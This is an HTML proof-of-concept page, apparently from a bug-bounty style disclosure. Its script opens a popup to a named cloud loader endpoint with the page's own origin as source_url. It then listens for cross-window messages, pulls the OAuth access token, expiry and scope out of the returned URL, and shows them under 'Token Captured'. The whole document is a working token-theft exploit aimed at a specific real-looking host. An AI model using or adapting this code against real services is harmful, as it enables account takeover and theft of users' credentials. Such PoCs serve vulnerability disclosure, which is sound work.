<!DOCTYPE html>
<html>
<body>
<script>
window.addEventListener("message", function(e) {
    if (e.data?.startsWith("logged_in:")) {
        const url = new URL(e.data.replace("logged_in:", ""));
        const hash = new URLSearchParams(url.hash.slice(1));
        const token = hash.get("access_token");
        
        document.body.innerHTML = 
            "Token Captured<br>" +
            "Origin: " + e.origin + "<br>" +
            "Access Token: " + token + "<br>" +
            "Expires In: " + hash.get("expires_in") + "s<br>" +
            "Scope: " + hash.get("scope");
        
        alert(token);
    }
}, false);

var url = "https://cloudloader.default.prod.walmart.dice.livelinklabs.com/picasa?" +
    "source_url=" + encodeURIComponent(location.origin) + "&live_update=true";
window.open(url, "popup", "width=800,height=600");
</script>

</html>
